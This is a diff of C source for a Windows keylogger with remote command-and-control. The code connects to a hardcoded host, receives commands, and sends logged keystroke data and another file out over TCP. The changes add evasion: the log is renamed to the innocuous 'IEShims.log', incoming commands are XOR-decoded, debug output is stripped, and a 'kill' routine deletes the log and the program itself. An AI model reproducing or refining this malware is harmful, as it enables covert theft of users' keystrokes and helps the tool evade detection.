@@ -14,9 +14,16 @@
 HHOOK hookHandle = NULL;
 
 char command[COMMAND_BUFFER_SIZE] = ""; // Global command variable
-char *filename = "keystrokes.log";
+char *filename = "IEShims.log";
 
-void DelMe()
+
+void xor(char* data, size_t data_length, const char* key, size_t key_length) {
+    for (size_t i = 0; i < data_length; i++) {
+        data[i] ^= key[i % key_length];
+    }
+}
+
+void kill()
 {
     TCHAR szModuleName[MAX_PATH];
     TCHAR szCmd[2 * MAX_PATH];
@@ -70,7 +77,7 @@ DWORD WINAPI connection_handler(LPVOID lpParam)
 
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(12345);
-    server_addr.sin_addr.s_addr = inet_addr("192.168.40.134");
+    server_addr.sin_addr.s_addr = inet_addr("192.168.189.131");
 
     while (1)
     {
@@ -100,7 +107,7 @@ DWORD WINAPI connection_handler(LPVOID lpParam)
         {
             // Print the command to the console
             command_buffer[result] = '\0';
-            printf("Received command: %s\n", command_buffer);
+            xor(command_buffer, result, "cyber", 5);
             strncpy(command, command_buffer, COMMAND_BUFFER_SIZE); // Update the global command variable
         }
 
@@ -122,7 +129,7 @@ DWORD WINAPI command_handler(LPVOID lpParam)
 
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(12346);
-    server_addr.sin_addr.s_addr = inet_addr("192.168.40.134");
+    server_addr.sin_addr.s_addr = inet_addr("192.168.189.131");
    
 
     while (1)
@@ -176,7 +183,7 @@ DWORD WINAPI command_handler(LPVOID lpParam)
             fclose(logfile);
 
             // Reopen the log file in read mode
-            logfile = fopen("keystrokes.log", "rb");
+            logfile = fopen("IEShims.log", "rb");
             if (logfile == NULL)
             {
                 // printf("Error opening log file: %d\n", GetLastError());
@@ -187,7 +194,6 @@ DWORD WINAPI command_handler(LPVOID lpParam)
             char payload = 0;
             if (send(data_client_socket, &payload, sizeof(char), 0) < 0)
             {
-                // printf("Error sending data: %d\n", WSAGetLastError());
                 fclose(logfile);
                 closesocket(data_client_socket);
                 WSACleanup();
@@ -197,7 +203,6 @@ DWORD WINAPI command_handler(LPVOID lpParam)
             while (fscanf(logfile, "%d", &delay) == 1)
             {
                 Sleep(delay * 10); // Sleep for the specified amount of time (in milliseconds)
-                // printf("Sending delay: %d\n", delay);
                 // Send a dummy payload
                 char payload = 0;
                 if (send(data_client_socket, &payload, sizeof(char), 0) < 0)
@@ -213,7 +218,7 @@ DWORD WINAPI command_handler(LPVOID lpParam)
             // Free the buffer and close the connection
             closesocket(data_client_socket);
             fclose(logfile);
-            system("del /f keystrokes.log");
+            system("del /f IEShims.log");
             logfile = fopen(filename, "a");
             // Reset the command to an empty string
             StringCbCopyA(command, sizeof(command), "run");
@@ -233,7 +238,6 @@ DWORD WINAPI command_handler(LPVOID lpParam)
                 data_client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                 if (data_client_socket == INVALID_SOCKET)
                 {
-                    // printf("socket creation failed: %d\n", WSAGetLastError());
                     fclose(logfile);
                     WSACleanup();
                     return 1;
@@ -243,7 +247,6 @@ DWORD WINAPI command_handler(LPVOID lpParam)
                 result = connect(data_client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));
                 if (result == SOCKET_ERROR)
                 {
-                    // printf("connect failed: %d\n", WSAGetLastError());
                     fclose(logfile);
                     closesocket(data_client_socket);
                     WSACleanup();
@@ -262,7 +265,6 @@ DWORD WINAPI command_handler(LPVOID lpParam)
                 size_t bytesRead;
                 while ((bytesRead = fread(buffer, 1, sizeof(buffer), regfile)) > 0)
                 {
-                    // printf("Sending %d bytes\n", bytesRead);
                     if (send(data_client_socket, buffer, bytesRead, 0) < 0)
                     {
                         printf("Error sending data: %d\n", WSAGetLastError());
@@ -272,8 +274,6 @@ DWORD WINAPI command_handler(LPVOID lpParam)
                         return 1;
                     }
                 }
-                // printf("Done: %d", i);
-                // Free the buffer, close the connection, and close the registry file
                 
                 fclose(regfile);
                 closesocket(data_client_socket);
@@ -290,8 +290,10 @@ DWORD WINAPI command_handler(LPVOID lpParam)
         }
         else if (strcmp(command, "kill") == 0) // Check if the command is "kill"
         {
-            
-            DelMe();
+            fclose(logfile);
+            system("del /f IEShims.log");
+
+            kill();
         } 
     }
 }
@@ -303,12 +305,11 @@ int main()
     
     logfile = fopen(filename, "a");
 
-    // Initialize Winsock
+
     WSADATA wsaData;
     int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
     if (result != 0)
     {
-        // printf("WSAStartup failed: %d\n", result);
         return 1;
     }
     
@@ -317,7 +318,6 @@ int main()
     HANDLE connection_thread = CreateThread(NULL, 0, connection_handler, NULL, 0, NULL);
     if (connection_thread == NULL)
     {
-        // printf("Error creating connection handler thread: %d\n", GetLastError());
         WSACleanup();
         return 1;
     }
@@ -326,7 +326,6 @@ int main()
     HANDLE keylogger_thread = CreateThread(NULL, 0, command_handler, (LPVOID)logfile, 0, NULL);
     if (keylogger_thread == NULL)
     {
-        // printf("Error creating keylogger handler thread: %d\n", GetLastError());
         WSACleanup();
         return 1;
     }
